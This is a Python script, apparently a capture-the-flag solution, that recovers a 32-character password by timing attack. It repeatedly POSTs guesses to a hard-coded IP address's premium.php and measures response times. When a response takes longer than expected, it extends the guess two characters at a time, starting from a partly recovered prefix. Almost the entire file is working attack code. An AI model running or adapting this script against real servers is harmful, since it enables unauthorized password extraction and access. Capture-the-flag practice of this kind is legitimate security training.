__author__ = 'joti'


import requests
import string
import time
from math import floor

# def bruteforce(charset, maxlength):
#     return (''.join(candidate)
#         for candidate in itertools.chain.from_iterable(itertools.product(charset, repeat=i)
#         for i in range(32, maxlength + 1)))
#
# charset=list(map(str,"1234567890abcdef"))
#
# completList = bruteforce(charset, 32)


def make_request(password):
    starttime = time.time()
    post_data = {"username":"~~FLAG~~", "password":tmp}
    f = requests.post("http://54.175.3.248:8089/premium.php", data= post_data)
    endtime = time.time()
    return endtime-starttime




pool = "abcdef0123456789"
pool = string.printable

#How many successfull (long enough) requests are needed
threshold=4

#This are the first N chars of the password
temp_solution= "667e217666"



#temp_solution=""
brutewoorse_string = temp_solution+" "*(32-len(temp_solution))




i=len(temp_solution)
while i < 32:
    print("\n==========================================\n")
    candiates=0

    while candiates!=1:
        candiates=0
        saved_j=0
        saved_k=0
        for j in range(len(pool)):
            for k in range(len(pool)):
                tmp = brutewoorse_string[:i] + pool[j] +pool[k]+ brutewoorse_string[i+2:]

                counts_over_threshold=0
                duration=0
                for m in range(threshold+floor(threshold/2)):
                    duration = make_request(tmp)
                    print(tmp ,duration)
                    if duration >= (i+2)*0.294:
                        counts_over_threshold+=1

                    if (m+1)-counts_over_threshold > threshold/4:
                        break

                print(pool[j], counts_over_threshold)
                if counts_over_threshold>threshold:
                    saved_j = j
                    saved_k = k
                    candiates+=1
                    print("CANDIATE", i, pool[j],pool[k], duration, brutewoorse_string)
                    break
                else:
                    pass
                    #print(i, pool[j], duration, brutewoorse_string)

        if candiates==1:
            brutewoorse_string=brutewoorse_string[:i] + pool[saved_j] + pool[saved_k]+ brutewoorse_string[i+2:]
            print(brutewoorse_string, i)
            i+=2
        elif candiates==0:
            i-=2
            print("MUCH WRONG ROUND")
        else:
            print("WRONG ROUND")
            #print(endtime-starttime)
            #print(f.request.body)
            #print(f.content)





